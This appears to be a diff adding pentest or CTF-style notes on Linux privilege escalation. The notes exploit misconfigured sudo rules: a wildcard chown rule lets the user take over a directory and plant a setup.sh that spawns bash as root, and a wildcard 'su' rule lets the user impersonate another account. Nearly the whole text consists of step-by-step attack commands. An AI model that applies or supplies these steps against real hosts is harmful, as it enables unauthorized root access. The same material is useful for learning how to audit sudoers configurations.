@@ -1,0 +1,40 @@
+[-] You can change the owner of directories 
+[-] run the command: sudo chown -hR [new_owner:old_owner] [/parent/children] 
+[-] you can then modify or create .sh script that can be run with root right 
+[-] Refer to Possible sudo pwnag! from above 
+[-] #! /bin/bash 
+[-] bash 
+[-] sudo ./[appp].sh
+
+Step 1: sudo -l
+
+user ALL=(root) NOPASSWD: /directory/*/user*/setup.sh
+user ALL=(root) NOPASSWD: /bin/chown -hR * /directory/
+
+Step 2 : we see that the user can run the below script with root priv
+User victim may run the following commands on this host:
+    (root) NOPASSWD: /directory/usr*/rep*/setup.sh, (root)
+
+Step 3 : we see that the current user can change the owner of the parent directory + children
+ !/bin/chown -hR root*,
+
+step 4 : create the folder
+sudo chown -hR usr_test:root /directory/
+cd /directory/
+mkdir -p /directory/usr_test/repo1/
+cd /directory/usr_test/repo1/
+vim setup.sh
+	#! /bin/bash
+	bash
+sudo ./setup.sh
+
+
+================================================================================================
+
+we see that :
+impersonate a user
+
+ (root) NOPASSWD: /bin/su - agc*
+
+we run:
+sudo su - agcpegt
